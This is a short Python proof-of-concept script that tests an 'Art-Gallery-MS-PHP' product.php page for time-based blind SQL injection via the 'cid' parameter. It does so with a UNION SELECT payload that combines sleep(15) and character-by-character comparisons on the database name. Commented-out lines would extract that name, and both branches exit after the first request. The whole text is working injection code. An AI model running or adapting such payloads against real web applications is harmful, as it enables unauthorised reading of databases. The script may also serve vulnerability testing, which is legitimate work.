#!/usr/bin/python
import sys
import requests

database_name=""
proxies={
    'http':'http://127.0.0.1:8080'
}
url = 'http://localhost/Art-Gallery-MS-PHP/product.php'

for i in range(1, 7):
    for j in range(32, 126):
        payload = f"' UNION SELECT 1,2,sleep(15),(SELECT*FROM(SELECT(ascii(substr(database(),{i},1))={j}))a),5,6-- -"
        data = {'cid': '-3' + payload, 'artname': 'Prints'}
        res = requests.get(url, params=data, proxies=proxies)
        response_time = res.elapsed.total_seconds()
        # print(response_time)
        if response_time >= 15:
            print("Vulnerable to CVE")
            # database_name += chr(j)
            # sys.stdout.write('\r'+database_name)
            # sys.stdout.flush()
            exit()
        else:
            print("Not Vulnerable To CVE")
            exit()
